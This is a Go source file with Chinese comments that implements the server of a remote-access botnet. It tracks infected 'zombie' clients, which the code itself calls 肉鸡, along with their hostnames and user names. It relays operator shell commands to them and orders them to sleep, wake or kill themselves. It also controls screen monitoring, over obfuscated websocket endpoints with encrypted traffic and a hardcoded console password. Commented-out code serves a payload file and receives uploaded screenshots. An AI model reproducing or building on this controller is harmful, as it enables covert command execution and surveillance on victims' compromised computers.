package main

import (
	"bytes"
	"compress/gzip"
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"golang.org/x/net/websocket"
	"io/ioutil"
	"math/big"
	"mtcomm/db/redis"
	logger "mtcomm/log"
	"net/http"
	"strconv"
	"strings"
	"time"
)

const (
	SEND_MSG       = "0"   //一般信息，如cmd指令，cmd运行后返回值，提示信息等
	GET_HEART      = "10"  //客户端心跳（hostname信息）
	GET_IP_LIST    = "20"  //控制台获取ip列表
	UPDATE_REMARK  = "30"  //控制台修改备注信息
	GET_OUT_TEXT   = "40"  //控制台读取客户端保存的输出信息
	SLEEP_ROUSE    = "50"  //休眠/唤醒客户端
	ALL_SLEEP      = "000" //全部休眠
	CLEAN_OUT_TEXT = "60"  //控制台清空客户端输出信息
	KILL_ME        = "444" //杀了我

	ON_SCREEN  = "70" //打开监控屏幕
	OFF_SCREEN = "71" //关闭监控屏幕
)

var (
	redisClient     redis.RedisClient
	clients_control = NewLockMapSS() //客户端唯一识别码和控制台uuid的对应
	control_clients = NewLockMapSS() //控制台uuid和客户端唯一识别码的对应
	control         = NewLockMapSC() //控制台uuid和控制台conn
	controlKey      = NewLockMapCS() //控制台conn连接和控制台uuid便于查找

	controlMsgs = make(chan Message, 500) //发给控制端的消息
	clients     = NewLockMapSC()          //客户端唯一识别码和客户端conn连接
	clientMsgs  = make(chan Message, 500) //发给客户端的消息
)

//zsetKey
func redisIP() string {
	return "IP"
}

//客户端基础信息，备注信息,hostname,
func redisINFO(ip string) string {
	return "INFO:" + ip
}

//输入输出信息
func redisMSG(ip string) string {
	return "MSG:" + ip
}

//客户端sleep信息
func redisSLEEP(ip string) string {
	return "SLEEP:" + ip
}
func init() {
	redisClient = redis.NewRedisClient(&redis.RedisServerInfo{
		Ctx:           context.TODO(),
		Logger:        logger.GetDefaultLogger(),
		RedisHost:     "127.0.0.1:6379",
		RedisPassword: "",
	})
	_, _ = redisClient.Get("ping") //测试连接,连接错误直接panic退出
}

type Message struct {
	Uuid      string `json:"uuid"`      //控制台唯一识别码
	Machineid string `json:"machineid"` //客户端唯一识别码
	Ip        string `json:"ip"`
	Name      string `json:"name"`
	Msg       string `json:"msg"`

	ByteData []byte `json:"byteData"` //截屏,文件，等等大的数据
	FileName string `json:"fileName"`
	//FileBody string `json:"fileBody"`

	Condoms []*Condom `json:"condoms"`
}
type Condom struct {
	Machineid string
	IP        string
	Name      string
	Whoami    string
	Remark    string
	Terrace   string
	Time      string
	checked   bool
}

func checkConn(conn *websocket.Conn) (string, string, bool) { //ip,machineid,验证结果
	now := time.Now().Format("2006-01-02 15:04:05")
	Unow := time.Now().Unix()
	r := conn.Request()
	ip := RemoteIp(r)
	if token := r.Header.Get("Sec-Websocket-Protocol"); token != "" {
		tokenBytes, err := base64.StdEncoding.DecodeString(token)
		if err != nil {
			fmt.Println(now, ip, "此客户端验证信息base64失败：", token)
			return ip, "", false
		}
		tokenBytes = encDec(tokenBytes)
		tokenStr := string(tokenBytes)       //当前时间戳#mac地址
		spl := strings.Split(tokenStr, "--") //spl[0]当前时间戳   spl[1]mac地址
		if len(spl) != 2 {                   //不符合token规则
			fmt.Println(now, ip, "此客户端验证信息不符合token规则：", tokenStr)
			return ip, "", false
		}
		token64, _ := strconv.ParseInt(spl[0], 10, 64)
		token64 = Unow - token64
		if token64 >= -86400 && token64 <= 86400 { //误差一天内,验证成功
			//ip = ip + " - " + spl[1]
			fmt.Println(now, ip, spl[1], "连接成功")
			return ip, spl[1], true
		} else {
			fmt.Println(now, ip, "此客户端token信息超过一天", token64)
			return ip, spl[1], false
		}
	} else {
		fmt.Println(now, ip, "此客户端无连接验证信息")
		return ip, "", false
	}

}

//客户端
func svrConnClientHandler(conn *websocket.Conn) {
	defer func() {
		if conn != nil {
			conn.Close()
		}
	}()
	//验证是否允许连接
	ip, machineid, flag := checkConn(conn)
	if flag == false {
		return
	}
	now := time.Now().Format("2006-01-02 15:04:05")
	_, _ = redisClient.Zadd(redisIP(), time.Now().Unix(), machineid) //存redis zset 心跳
	//连上后先查看是否存在要接收的休眠消息,是的话先推送缓存的休眠消息
	sleepflag, err := redisClient.Get(redisSLEEP(machineid))
	if err != nil {
		now := time.Now().Format("2006-01-02 15:04:05")
		fmt.Println(now, ip, machineid, "查询休眠错误", err)
		return
	}
	if sleepflag != "" { //有休眠
		msg := Message{Name: SLEEP_ROUSE, Msg: sleepflag, Machineid: machineid}
		err := sendMessage(msg, conn)
		if err != nil {
			fmt.Println(now, "缓存消息推失败", err)
			return
		}
		if msg.Msg == "0" { //解除休眠
			_ = redisClient.Del(redisSLEEP(machineid))
		} else {
			clients.Delete(machineid) //还有休眠，删除连接池中连接
			return
		}
	}
	clients.Set(machineid, conn) //确认没休眠，存入连接池
	defer func(deferMachineid string) { //删除连接池连接
		clients.Delete(deferMachineid)
	}(machineid)
	for {
		reqbyts, err := readMessage(conn) //接客户端收传回来的消息传给控制台
		now := time.Now().Format("2006-01-02 15:04:05")
		if err != nil {
			fmt.Println(now, ip, machineid, "断开连接", err)
			return
		}
		message, err := json2Message(reqbyts)
		if err != nil {
			fmt.Println(now, ip, machineid, "解密后转Message错误:", err)
			return
		}
		if message.Name == GET_HEART { //发送的（hostname）心跳信息,
			if _, ok := clients.exist(machineid); !ok { //有心跳代表还存活，如果连接池丢失就重新存入连接池
				clients.Set(machineid, conn)
			}
			_, _ = redisClient.Zadd(redisIP(), time.Now().Unix(), machineid) //存redis zset 心跳
			hostMap, err := json2Map([]byte(message.Msg))
			if err == nil { //没有错的情况下才保存
				hostMap["ip"] = ip                                   //ip存进去
				_ = redisClient.Hmset(redisINFO(machineid), hostMap) //保存客户端信息
			}
			message.Machineid = machineid
			clientMsgs <- message // 反应客户端
			continue              //心跳消息只服务器保存，无需发送到控制台
		} else if message.Name == SEND_MSG { //返回给控制台的信息
			err := redisClient.APPEND(redisMSG(machineid), message.Msg+"\r\n")
			if err != nil {
				fmt.Println(now, "客户端存历史消息失败：", err)
			}
		} else if message.Name == KILL_ME { //肉鸡已自杀
			_ = redisClient.APPEND(redisMSG(machineid), ip+" KILL OK!\r\n")
			controlMsgs <- Message{Name: SEND_MSG, Machineid: machineid, Msg: ip + " KILL OK!\r\n"} //发给控制端状态
			break                                                                                   //结束
		}

		message.Machineid = machineid
		message.Ip = ip
		controlMsgs <- message

	}
}

func controlLogin(conn *websocket.Conn) (string, bool) {
	now := time.Now().Format("2006-01-02 15:04:05")
	r := conn.Request()
	ip := RemoteIp(r)
	if token := r.Header.Get("Sec-Websocket-Protocol"); token != "" {
		tokenBytes, err := base64.StdEncoding.DecodeString(token)
		if err != nil {
			fmt.Println(now, ip, "此控制台登陆信息base64失败：", token)
			return ip, false
		}
		tokenBytes = encDec(tokenBytes)
		tokenStr := string(tokenBytes)
		if tokenStr == "aaa-aaa" {
			fmt.Println(now, ip, "控制台登陆成功!")
			return ip, true //登陆成功
		} else {
			fmt.Println(now, ip, "此控制台登陆账号密码错误：", token)
			return ip, false
		}
	} else {
		fmt.Println(now, ip, "此控制台无登陆验证信息")
		return ip, false
	}

}

//控制台
func svrConnControlHandler(conn *websocket.Conn) {
	defer conn.Close()
	//验证是否允许连接
	_, flag := controlLogin(conn)
	if flag == false {
		return
	}
	defer func() {
		uuid := controlKey.Get(conn)
		machineid := control_clients.Get(uuid) //获取客户端唯一识别码
		control.Delete(uuid)
		controlKey.Delete(conn)
		control_clients.Delete(uuid)
		clients_control.Delete(machineid)
		now := time.Now().Format("2006-01-02 15:04:05")
		fmt.Println(now, uuid+"控制台关闭")
	}()
	for {
		reqbyts, err := readMessage(conn) //接收控制台的消息{要操作的IP,消息类型Type,消息内容}，发给客户端
		now := time.Now().Format("2006-01-02 15:04:05")
		if err != nil {
			fmt.Println(now, "控制台readMessage:", err)
			return
		}
		message, err := json2Message(reqbyts)
		if err != nil {
			fmt.Println(now, "控制台json2Message:", err)
			return
		}

		if message.Name == SEND_MSG { //发给客户端的指令信息保存到redis
			err := redisClient.APPEND(redisMSG(message.Machineid), "█"+now+">"+message.Msg+"\r\n")
			if err != nil {
				fmt.Println(now, "控制台存历史消息失败：", err)
			}
		} else if message.Name == GET_IP_LIST { //控制台获取客户端ip列表
			err = ipList(conn) //发送ip列表到控制台
			if err != nil {
				fmt.Println(now, "控制台获取客户端ip列表失败：", err)
			}
			continue
		} else if message.Name == UPDATE_REMARK { //控制台修改客户端备注信息
			err := upRemark(message, conn)
			if err != nil {
				fmt.Println(now, "控制台修改客户端备注失败：", err)
			}
			continue
		} else if message.Name == GET_OUT_TEXT { //控制台点击ip,读取客户端输出信息
			err := readOutText(message, conn)
			if err != nil {
				fmt.Println(now, "控制台读取客户端输出信息失败：", err)
			}
			continue
		} else if message.Name == CLEAN_OUT_TEXT { //清空客户端输出信息
			err := cleanOutText(message)
			if err != nil {
				fmt.Println(now, "控制台读取客户端输出信息失败：", err)
			}
			continue
		} else if message.Name == SLEEP_ROUSE { //休眠
			if message.Msg != "0" {
				if clientConn, ok := clients.exist(message.Machineid); ok {
					_ = clientConn.Close()
					clients.Delete(message.Machineid) //删除连接池中的连接
				}
				reM := Message{Machineid: message.Machineid, Name: SEND_MSG, Msg: "sleep " + message.Msg + " OK!"}
				_ = sendMessage(reM, conn) //返回控制台休眠结果
			}
		} else if message.Name == ALL_SLEEP { //全部休眠
			allSleep(conn)
			continue
		} else if message.Name == OFF_SCREEN { //关闭屏幕查看器，连接传输的客户端conn需要换成屏幕查看器的conn
			offScreen(message)
			continue
		}
		control.Set(message.Uuid, conn)                      // 控制台链接存起来
		controlKey.Set(conn, message.Uuid)                   // 反存一个便于查找
		clients_control.Set(message.Machineid, message.Uuid) //客户端。控制台的对应关系存储起来
		control_clients.Set(message.Uuid, message.Machineid) //反存一个便于查找
		clientMsgs <- message
	}
}

func pushClientMsg() { //发送消息到客户端
	for {
		msg := <-clientMsgs
		now := time.Now().Format("2006-01-02 15:04:05")
		if conn, ok := clients.exist(msg.Machineid); ok { //查看此控制台操作的肉机是否连接中
			err := sendMessage(msg, conn)
			if err != nil {
				fmt.Println(now, "报错了", msg)
				clientSleepMsgCheck(msg)      //判断指令并添加到缓存
				clients.Delete(msg.Machineid) //删除连接池中的连接
			}
		} else {
			fmt.Println(now, "没连接", msg)
			clientSleepMsgCheck(msg) //判断指令并添加到缓存
		}
	}
}
func clientSleepMsgCheck(msg Message) {
	if msg.Name == SLEEP_ROUSE { //是唤醒/休眠指令
		_ = redisClient.Set(redisSLEEP(msg.Machineid), msg.Msg)
	} else { //非休眠指令直接返回提示
		msg.Name = SEND_MSG
		msg.Msg = msg.Ip + "貌似已休眠或者已丢失，请先尝试唤醒它吧！"
		controlMsgs <- msg
	}
}

func pushControlMsg() { //发送消息到控制台
	for {
		msg := <-controlMsgs
		if controlUuid, ok := clients_control.exist(msg.Machineid); ok { //查看此客户端唯一id对应的控制台唯一id是否存在
			if conn, ok2 := control.exist(controlUuid); ok2 { //拿到此控制台的连接
				_ = sendMessage(msg, conn)
			}
		}
	}
}

//休眠全部
func allSleep(conn *websocket.Conn) {
	msg := Message{Name: SEND_MSG}
	for machineid, clientConn := range clients.Map { //遍历线程池中连接
		result, _ := rand.Int(rand.Reader, big.NewInt(30)) //30以内真随机数
		sleepstr := fmt.Sprint(120 + result.Int64())
		_ = redisClient.Set(redisSLEEP(machineid), sleepstr) //休眠时间设置到redis中

		_ = clientConn.Close()    //关闭与客户端的连接
		clients.Delete(machineid) //删除连接池中的连接
		msg.Msg = machineid + " sleep " + sleepstr
		_ = sendMessage(msg, conn)
	}
}

func cleanOutText(message Message) error {
	err := redisClient.Del(redisMSG(message.Machineid)) //删除
	if err != nil {
		return err
	}
	return nil
}
func readOutText(message Message, conn *websocket.Conn) error {
	if uuid, ok := clients_control.exist(message.Machineid); ok { //此客户端ip上一个被操作的控制端uuid是谁
		if control_clients.Get(uuid) == message.Machineid { //此uuid控制端现在操作的ip是我要操作的ip
			message.Uuid = uuid //这个人正在操作
		} else {
			message.Uuid = "" //没人操作,需要清空此uuid,以免冲突
		}
	} else {
		message.Uuid = "" //没人操作,需要清空此uuid,以免冲突
	}
	MSG, err := redisClient.Get(redisMSG(message.Machineid))
	if err != nil {
		return err
	}
	message.Msg = MSG
	_ = sendMessage(message, conn)
	return nil
}

func upRemark(message Message, conn *websocket.Conn) error {
	err := redisClient.Hset(redisINFO(message.Machineid), "remark", message.Msg)
	if err != nil {
		return err
	}
	_ = sendMessage(message, conn)
	return nil
}
func ipList(conn *websocket.Conn) error {
	unixNow := time.Now().Unix()
	datas, err := redisClient.ZrangeWithscores(redisIP(), 0, -1)
	if err != nil {
		return err
	}
	condoms := []*Condom{}
	for i := 0; i < len(datas)-1; i = i + 2 {
		condom := &Condom{}
		machineid := datas[i]
		score := datas[i+1]
		scoreInt64, _ := strconv.ParseInt(score, 10, 64)
		values, _ := redisClient.Hmget(redisINFO(machineid), "hostname", "whoami", "remark", "ip", "terrace")
		if _, ok := clients.exist(machineid); ok { //正在连接中的ip弄个小标签
			condom.IP = "*" + values[3]
		} else {
			condom.IP = values[3]
		}
		condom.Machineid = machineid
		condom.Name = values[0]
		condom.Whoami = values[1]
		condom.Remark = values[2]
		condom.Terrace = values[4]
		condom.Time = fmt.Sprint(unixNow - scoreInt64) //转成string
		condoms = append(condoms, condom)

	}
	message := Message{Name: GET_IP_LIST, Condoms: condoms}
	_ = sendMessage(message, conn)
	return nil

}
func json2Message(strByte []byte) (Message, error) {
	var dat Message
	if err := json.Unmarshal(strByte, &dat); err == nil {
		return dat, nil
	} else {
		return dat, err
	}
}

func json2Map(strByte []byte) (map[string]string, error) {
	var dat map[string]string
	if err := json.Unmarshal(strByte, &dat); err == nil {
		return dat, nil
	} else {
		return dat, err
	}
}

//读取数据
func readMessage(conn *websocket.Conn) ([]byte, error) {
again:
	fr, err := conn.NewFrameReader()

	if err != nil {
		return nil, err
	}
	frame, err := conn.HandleFrame(fr)
	if err != nil {
		return nil, err
	}
	if frame == nil {
		goto again
	}
	reqBytes, err := ioutil.ReadAll(frame)
	if err != nil {
		return reqBytes, err
	}
	reqBytes = encDec(reqBytes)      //解密数据
	reqBytes = UnGzipBytes(reqBytes) //解压数据
	return reqBytes, nil
}

//发送websocket消息
func sendMessage(message Message, conn *websocket.Conn) error {
	jsonBytes, _ := json.Marshal(message) //结构体转json
	jsonBytes = gzipBytes(jsonBytes)      //压缩结构体
	jsonBytes = encDec(jsonBytes)         //加密
	if conn != nil {
		_, err := conn.Write(jsonBytes) //发送消息
		return err
	} else {
		return errors.New("conn is null pointer")
	}

}

//gzip压缩
func gzipBytes(byt []byte) []byte {
	var buf bytes.Buffer
	//zw := gzip.NewWriter(&buf)
	zw, _ := gzip.NewWriterLevel(&buf, gzip.BestCompression)

	zw.Write(byt)
	if err := zw.Close(); err != nil {
	}
	return buf.Bytes()
}

//gzip解压缩
func UnGzipBytes(byt []byte) []byte {
	var buf bytes.Buffer
	buf.Write(byt)
	zr, _ := gzip.NewReader(&buf)
	defer func() {
		if zr != nil {
			zr.Close()
		}
	}()
	a, _ := ioutil.ReadAll(zr)
	return a
}

//func checkActive() {
//	for {
//		for ip, conn := range clients { //验证客户端存活
//			Unow := time.Now().Unix()
//			UheartTime, _ := redisClient.Zscore(redisIP(), ip)
//			if Unow-UheartTime > 60 { //一分钟没交互
//				_ = conn.Close()    //关闭
//				delete(clients, ip) //删除
//			}
//		}
//		time.Sleep(time.Minute) //休眠一分钟
//	}
//}

func main() {
	fmt.Println("启动。。。。")
	go pushClientMsg()  //发消息给客户端
	go pushControlMsg() //发消息给控制台
	//go checkActive()    //判断存活
	http.Handle("/hfuiefdhuiwe32uhi", websocket.Handler(svrConnClientHandler))
	http.Handle("/screenhfuiefdhuiwe32uhi", websocket.Handler(screenhfuiefdhuiwe32uhi))
	http.Handle("/svrConnControlHandler", websocket.Handler(svrConnControlHandler))
	//http.HandleFunc("/aaa", aaa)
	//http.HandleFunc("/pushImg2ha2ha2ha", pushImg2ha2ha2ha)
	err := http.ListenAndServe(":80", nil)
	if err != nil {
		fmt.Println("监听端口：", err)
	}
	fmt.Println("结束.");
}

//func aaa(w http.ResponseWriter, r *http.Request) {
//	fmt.Println(RemoteIp(r), "请求下载aaa")
//	filebyte, err := ioutil.ReadFile("./aaa")
//	if err != nil {
//		fmt.Println("打开文件错误")
//		return
//	}
//	_, err = w.Write(filebyte)
//	if err != nil {
//		fmt.Println("返回值错误")
//		return
//	}
//}
//func pushImg2ha2ha2ha(w http.ResponseWriter, r *http.Request) {
//	fmt.Println(RemoteIp(r), "开始上传文件")
//	returnMSG := []byte("500")
//	bytes, err := decodeRequest(r)
//	if err != nil {
//		fmt.Println("文件流获取失败", err)
//		_, _ = w.Write(returnMSG)
//		return
//	}
//	file, err := os.Create(fmt.Sprint(time.Now().Unix()) + ".png")
//	defer func() {
//		if file != nil {
//			file.Close()
//		}
//	}()
//	if err != nil {
//		fmt.Println("生成文件失败", err)
//		_, _ = w.Write(returnMSG)
//		return
//	}
//	_, err = file.Write(bytes)
//	if err != nil {
//		fmt.Println("文件流写入失败", err)
//		_, _ = w.Write(returnMSG)
//		return
//	}
//	_, _ = w.Write([]byte("100"))
//}
//
////格式化参数
//func decodeRequest(r *http.Request) ([]byte, error) {
//	defer r.Body.Close()
//	return ioutil.ReadAll(r.Body)
//}
